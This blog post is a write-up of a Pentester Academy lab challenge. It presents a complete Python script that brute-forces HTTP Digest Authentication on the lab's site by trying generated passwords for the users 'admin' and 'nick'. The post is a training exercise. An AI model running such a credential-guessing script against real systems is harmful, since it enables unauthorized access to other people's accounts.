---
author: AnirudhAnand
comments: true
date: 2015-01-17 05:05:13+00:00
layout: post
slug: wap-challenge-5-brute-forcing-digest-authentication
title: 'WAP Challenge 5: Brute forcing Digest Authentication'
wordpress_id: 5840
categories:
- python
summary: Writeup for WAP challenge 5 from pentester academy
---

In the last article we saw how can we actually brute force HTTP Basic Authentication, this time we will see how we can do the same in a Digest based Authentication. If you are not already familiar with [Digest based authentication](http://en.wikipedia.org/wiki/Digest_access_authentication), I strongly recommend you to read more about it and then continue with this article. The key difference here is that for an HTTP basic authentication we can simply pass on different username:password combinations and it passes in plain text through the network. But for  a digest based auth, encryption is being introduced so that hackers cannot eavesdrop on the communication between you and the server.

Lets us look into the script.

{% highlight python lineos %} 
    #!/usr/bin/python3.4
    # Written by Anirudh Anand (lucif3r) : email - anirudh@anirudhanand.com__author__ = 'lucif3r'
    # This is the solution to Pentester Academy's WAP Challenge 4: Digest Authentication Brute-
    # Force. The script uses urllib library in python 3.4
    __author__ = 'lucif3r'
    import urllib.request
    import urllib.error
    import itertools
    def generate_wordlist(words, l):
        """
        :rtype : list
        :param words The string from which words should be made:
        :param l length of the strings:
        :return:
        """
        list_pass = []
        for i in itertools.product(words, repeat=l):
            list_pass.append("".join(i))
        return list_pass
    def brute_force(username):
        """
        :param username:  Username for Brute forcing
        """
        url = 'http://pentesteracademylab.appspot.com/lab/webapp/digest/1'
        passwords = generate_wordlist('ads', 5)
        print("wordlist generated. Starting Brute FOrce...")
        for i in passwords:
            authhandler = urllib.request.HTTPDigestAuthHandler()
            authhandler.add_password('Pentester Academy', url, username, i)
            opener = urllib.request.build_opener(authhandler)
            urllib.request.install_opener(opener)
            print(i)
            try:
                    page = urllib.request.urlopen(url)
            except urllib.error.HTTPError as e:
                    print("failing")
            else:
                    print ('Username: '+username+' Password: '+i)
                    break
    brute_force('admin')
    brute_force('nick')
{% endhighlight %}

As you can see, we used the urllib module in python 3.4 to create an **authhandler** which handles the HTTP Digest Authentication along with the password, url and other things. As you can read from the [Wikipedia](http://en.wikipedia.org/wiki/Digest_access_authentication) that an md5 hashing is done using the nounce, url, password etc but when we automate this in python, **urllib** will take care of everything for us. We don't need to bother about it.

If you find a better way to complete this or if you are facing any issues regarding to this challenge, don't hesitate to drop a comment.